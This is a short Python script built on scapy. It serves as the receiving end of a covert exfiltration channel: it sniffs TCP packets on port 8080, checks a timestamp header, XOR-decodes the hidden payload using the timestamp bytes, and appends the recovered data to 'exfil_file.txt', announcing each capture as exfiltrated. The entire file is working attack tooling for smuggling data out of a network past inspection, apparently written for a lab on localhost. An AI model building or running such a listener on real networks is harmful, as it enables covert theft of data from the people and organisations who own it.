from scapy.all import sniff, TCP, Raw, IP
import os
import struct
import time

OUTFILE = "exfil_file.txt"
FILTER = "tcp and src host 127.0.0.1 and port 8080 and tcp[13] & 0x18 == 0x18" #bpf filter port 8080 and PSH+ACK
TIME_WINDOW = 300  # accept timestamps within ±5 minutes

#grab TCP payload
def handle_packet(pkt):
    if pkt.haslayer(TCP) and pkt.haslayer(Raw):
        payload = bytes(pkt[Raw].load)

        # need at least 4 (ts) + 2 (len)
        if len(payload) < 6:  
            return

        # read timestamp from first 4 bytes (little-endian)
        ts32 = struct.unpack_from('<I', payload, 0)[0]

        # check if timestamp is within window
        now = int(time.time())
        if abs(now - ts32) > TIME_WINDOW:
            return

        # read file length from bytes 4-5. >H is big-endian unsigned short
        data_len = struct.unpack_from('>H', payload, 4)[0]

        #prevent reading beyond payload
        if len(payload) < 6 + data_len:
            return

        # XOR-decode the content using timestamp bytes
        ts_bytes = [(ts32 >> (i * 8)) & 0xFF for i in range(4)]
        decoded = bytes(payload[6 + i] ^ ts_bytes[i % 4] for i in range(data_len))

        #append decoded data to output file
        with open(OUTFILE, "a") as f:
            f.write(decoded.decode('utf-8', errors='ignore') + "\n")
        print(f"Exfiled data from {pkt[IP].src} | timestamp: {ts32}")
        raise KeyboardInterrupt #kill sniffer

def main():
    abs_path = os.path.abspath(OUTFILE)
    print(f"Starting sniff (filter='{FILTER}'). Writing exfiled data to {abs_path}")
    sniff(iface="ens18", filter=FILTER, prn=handle_packet, store=0) 

if __name__ == "__main__":
    main()
